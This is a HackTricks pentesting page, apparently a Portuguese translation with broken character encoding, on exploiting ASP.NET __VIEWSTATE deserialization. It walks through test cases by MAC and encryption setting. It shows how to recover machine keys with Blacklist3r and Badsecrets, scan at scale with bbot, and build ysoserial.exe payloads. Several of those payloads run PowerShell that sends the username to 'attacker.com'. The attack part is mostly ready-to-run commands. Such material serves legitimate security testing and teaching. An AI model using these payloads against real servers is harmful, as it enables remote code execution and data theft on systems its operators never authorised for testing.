# Exploiting \_\_VIEWSTATE without knowing the secrets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **inscreva-se** para **Intigriti**, uma **plataforma de bug bounty premium criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## O que √© ViewState

**ViewState** serve como o mecanismo padr√£o no ASP.NET para manter dados de p√°gina e controle entre p√°ginas da web. Durante a renderiza√ß√£o do HTML de uma p√°gina, o estado atual da p√°gina e os valores a serem preservados durante um postback s√£o serializados em strings codificadas em base64. Essas strings s√£o ent√£o colocadas em campos ViewState ocultos.

As informa√ß√µes do ViewState podem ser caracterizadas pelas seguintes propriedades ou suas combina√ß√µes:

* **Base64**:
* Este formato √© utilizado quando tanto os atributos `EnableViewStateMac` quanto `ViewStateEncryptionMode` est√£o definidos como falso.
* **Base64 + MAC (C√≥digo de Autentica√ß√£o de Mensagem) Ativado**:
* A ativa√ß√£o do MAC √© alcan√ßada definindo o atributo `EnableViewStateMac` como verdadeiro. Isso fornece verifica√ß√£o de integridade para os dados do ViewState.
* **Base64 + Criptografado**:
* A criptografia √© aplicada quando o atributo `ViewStateEncryptionMode` est√° definido como verdadeiro, garantindo a confidencialidade dos dados do ViewState.

## Casos de Teste

A imagem √© uma tabela detalhando diferentes configura√ß√µes para ViewState no ASP.NET com base na vers√£o do framework .NET. Aqui est√° um resumo do conte√∫do:

1. Para **qualquer vers√£o do .NET**, quando tanto o MAC quanto a Criptografia est√£o desativados, uma MachineKey n√£o √© necess√°ria, e, portanto, n√£o h√° um m√©todo aplic√°vel para identific√°-la.
2. Para **vers√µes abaixo de 4.5**, se o MAC estiver ativado, mas a Criptografia n√£o, uma MachineKey √© necess√°ria. O m√©todo para identificar a MachineKey √© referido como "Blacklist3r."
3. Para **vers√µes abaixo de 4.5**, independentemente de o MAC estar ativado ou desativado, se a Criptografia estiver ativada, uma MachineKey √© necess√°ria. Identificar a MachineKey √© uma tarefa para "Blacklist3r - Desenvolvimento Futuro."
4. Para **vers√µes 4.5 e superiores**, todas as combina√ß√µes de MAC e Criptografia (se ambos forem verdadeiros, ou um for verdadeiro e o outro falso) necessitam de uma MachineKey. A MachineKey pode ser identificada usando "Blacklist3r."

### Caso de Teste: 1 ‚Äì EnableViewStateMac=false e viewStateEncryptionMode=false

Tamb√©m √© poss√≠vel desativar completamente o ViewStateMAC definindo a chave de registro `AspNetEnforceViewStateMac` como zero em:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identificando Atributos ViewState**

Voc√™ pode tentar identificar se o ViewState est√° protegido por MAC capturando uma solicita√ß√£o contendo este par√¢metro com o BurpSuite. Se o MAC n√£o for usado para proteger o par√¢metro, voc√™ pode explor√°-lo usando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 ‚Äì Como o Test case 1, mas o cookie ViewState n√£o √© enviado pelo servidor

Os desenvolvedores podem **remover o ViewState** de se tornar parte de uma solicita√ß√£o HTTP (o usu√°rio n√£o receber√° esse cookie).\
Pode-se supor que se o **ViewState** **n√£o estiver presente**, sua implementa√ß√£o est√° **segura** contra quaisquer vulnerabilidades potenciais decorrentes da desserializa√ß√£o do ViewState.\
No entanto, esse n√£o √© o caso. Se adicionarmos o **par√¢metro ViewState** ao corpo da solicita√ß√£o e enviarmos nossa carga √∫til serializada criada usando ysoserial, ainda seremos capazes de alcan√ßar **execu√ß√£o de c√≥digo** como mostrado no **Caso 1**.

### Test Case: 2 ‚Äì .Net < 4.5 e EnableViewStateMac=true & ViewStateEncryptionMode=false

Para **habilitar o ViewState MAC** para uma **p√°gina espec√≠fica**, precisamos fazer as seguintes altera√ß√µes em um arquivo aspx espec√≠fico:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Podemos tamb√©m fazer isso para a **aplica√ß√£o** **geral** configurando-o no arquivo **web.config** conforme mostrado abaixo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Como o par√¢metro √© protegido por MAC, desta vez, para executar com sucesso o ataque, primeiro precisamos da chave utilizada.

Voc√™ pode tentar usar [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar a chave utilizada.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) √© outra ferramenta que pode identificar machineKeys conhecidos. √â escrita em Python, ent√£o, ao contr√°rio do Blacklist3r, n√£o h√° depend√™ncia do Windows. Para viewstates .NET, h√° um utilit√°rio "python blacklist3r", que √© a maneira mais r√°pida de us√°-lo.

Ele pode ser fornecido com o viewstate e o gerador diretamente:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Ou, pode se conectar diretamente √† URL de destino e tentar extrair o viewstate do HTML:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Para procurar por viewstates vulner√°veis em grande escala, em conjunto com a enumera√ß√£o de subdom√≠nios, o m√≥dulo `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) pode ser usado:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Se voc√™ tiver sorte e a chave for encontrada, voc√™ pode prosseguir com o ataque usando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
Em casos onde o par√¢metro `_VIEWSTATEGENERATOR` **n√£o √© enviado** pelo servidor, voc√™ **n√£o** precisa **fornecer** o par√¢metro `--generator` **mas sim estes**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Test Case: 3 ‚Äì .Net < 4.5 e EnableViewStateMac=true/false e ViewStateEncryptionMode=true

Neste caso, n√£o se sabe se o par√¢metro est√° protegido com MAC. Ent√£o, o valor provavelmente est√° criptografado e voc√™ **precisar√° da Machine Key para criptografar seu payload** para explorar a vulnerabilidade.

**Neste caso, o** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **m√≥dulo est√° em desenvolvimento...**

**Antes do .NET 4.5**, o ASP.NET pode **aceitar** um par√¢metro \_`__VIEWSTATE`\_ **n√£o criptografado** dos usu√°rios **mesmo** que **`ViewStateEncryptionMode`** tenha sido definido como _**Always**_. O ASP.NET **apenas verifica** a **presen√ßa** do par√¢metro **`__VIEWSTATEENCRYPTED`** na solicita√ß√£o. **Se algu√©m remover este par√¢metro e enviar o payload n√£o criptografado, ele ainda ser√° processado.**

Portanto, se os atacantes encontrarem uma maneira de obter a Machinekey atrav√©s de outra vulnerabilidade, como travessia de arquivos, o comando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) usado no **Caso 2** pode ser usado para realizar RCE usando a vulnerabilidade de desserializa√ß√£o do ViewState.

* Remova o par√¢metro `__VIEWSTATEENCRYPTED` da solicita√ß√£o para explorar a vulnerabilidade de desserializa√ß√£o do ViewState, caso contr√°rio, retornar√° um erro de valida√ß√£o de MAC do Viewstate e a explora√ß√£o falhar√°.

### Test Case: 4 ‚Äì .Net >= 4.5 e EnableViewStateMac=true/false e ViewStateEncryptionMode=true/false exceto ambos os atributos para false

Podemos for√ßar o uso do framework ASP.NET especificando o par√¢metro abaixo dentro do arquivo web.config, conforme mostrado abaixo.
```xml
<httpRuntime targetFramework="4.5" />
```
Alternativamente, isso pode ser feito especificando a op√ß√£o abaixo dentro do par√¢metro `machineKey` do arquivo web.config.
```bash
compatibilityMode="Framework45"
```
Como no anterior, o **valor est√° criptografado.** Ent√£o, para enviar um **payload v√°lido, o atacante precisa da chave**.

Voc√™ pode tentar usar [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar a chave sendo usada:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Para uma descri√ß√£o mais detalhada sobre IISDirPath e TargetPagePath [consulte aqui](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Ou, com [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (com um valor gerador):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Uma vez que uma chave de m√°quina v√°lida √© identificada, **o pr√≥ximo passo √© gerar um payload serializado usando** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Se voc√™ tiver o valor de `__VIEWSTATEGENERATOR`, pode tentar **usar** o par√¢metro `--generator` com esse valor e **omitir** os par√¢metros `--path` e `--apppath`.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

Uma explora√ß√£o bem-sucedida da vulnerabilidade de desserializa√ß√£o do ViewState levar√° a uma solicita√ß√£o fora de banda para um servidor controlado pelo atacante, que inclui o nome de usu√°rio. Esse tipo de exploit √© demonstrado em uma prova de conceito (PoC) que pode ser encontrada atrav√©s de um recurso intitulado "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". Para mais detalhes sobre como o processo de explora√ß√£o funciona e como utilizar ferramentas como Blacklist3r para identificar o MachineKey, voc√™ pode revisar a [PoC de Explora√ß√£o Bem-Sucedida](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).

### Caso de Teste 6 ‚Äì ViewStateUserKeys est√° sendo usado

A propriedade **ViewStateUserKey** pode ser usada para **defender** contra um **ataque CSRF**. Se tal chave foi definida na aplica√ß√£o e tentamos gerar o payload **ViewState** com os m√©todos discutidos at√© agora, o **payload n√£o ser√° processado pela aplica√ß√£o**.\
Voc√™ precisa usar mais um par√¢metro para criar corretamente o payload:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Resultado de uma Explora√ß√£o Bem-Sucedida <a href="#poc" id="poc"></a>

Para todos os casos de teste, se o payload ViewState YSoSerial.Net funcionar **com sucesso**, o servidor responde com ‚Äú**500 Internal server error**‚Äù tendo o conte√∫do da resposta ‚Äú**As informa√ß√µes de estado s√£o inv√°lidas para esta p√°gina e podem estar corrompidas**‚Äù e recebemos a requisi√ß√£o OOB.

Verifique [mais informa√ß√µes aqui](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/\[\*\*https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\*\*]\(https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\)/README.md)

## Refer√™ncias

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
